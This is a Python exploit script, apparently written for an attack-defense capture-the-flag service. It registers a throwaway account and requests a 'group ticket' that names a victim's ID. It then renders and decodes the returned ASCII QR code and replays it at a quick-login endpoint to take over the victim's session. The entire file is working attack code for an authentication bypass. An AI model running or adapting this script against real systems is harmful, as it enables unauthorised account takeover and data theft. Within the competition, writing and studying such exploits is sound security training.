from pwn import *
from hashlib import sha256
import requests
from PIL import Image, ImageDraw, ImageFont, ImageOps
from pyzbar.pyzbar import decode, ZBarSymbol
import os

port = 8000

FONT_PATH = os.path.join(os.path.dirname(os.path.abspath(__file__)), "SourceCodePro-Regular.ttf")
if not os.path.exists(FONT_PATH):
    response = requests.get('https://github.com/adobe-fonts/source-code-pro/raw/release/TTF/SourceCodePro-Regular.ttf')
    assert response.status_code == 200
    with open(FONT_PATH, 'wb') as f:
        f.write(response.content)


def randstr():
    return "".join([random.choice(string.ascii_letters + string.digits) for n in range(random.randint(5,10))])

def exploit(target, flag_ids):
    ids=flag_ids.split(",")
    s = requests.Session()
    username = randstr()
    first = randstr()
    last = randstr()
    email = randstr()+"@"+randstr()+".com"
    password = randstr()
    register_data = {"username": username, "first": first, "last": last, "email": email, "password": password}
    r = s.post(f"https://{target}:{port}/register",data=register_data,timeout=1, verify=False)
    for flag_id in ids:
        r = s.post(f"https://{target}:{port}/generate_group_ticket",data={"friends": [email, flag_id]},timeout=1, verify=False)

        qrcode = r.text.split('<code style="display: block; white-space: pre">')[1].split('</code>')[0]

        #print(qrcode)

        img = Image.new('RGB', (2000, 2000))
        d = ImageDraw.Draw(img)
        font = ImageFont.truetype(FONT_PATH, 40)
        d.text((0, 0), qrcode, fill=(255, 255, 255), font=font)
        img = ImageOps.invert(img)

        data = decode(img, symbols=[ZBarSymbol.QRCODE])
        print(data[0].data)
        s2 = requests.Session()
        r = s2.post(f"https://{target}:{port}/quick_login",data={"ticket": data[0].data},timeout=1, verify=False)
        print(r.text)
        print(r.headers)

        


        


if __name__ == '__main__':
    exploit(sys.argv[1] if len(sys.argv) > 1 else 'localhost', sys.argv[2])
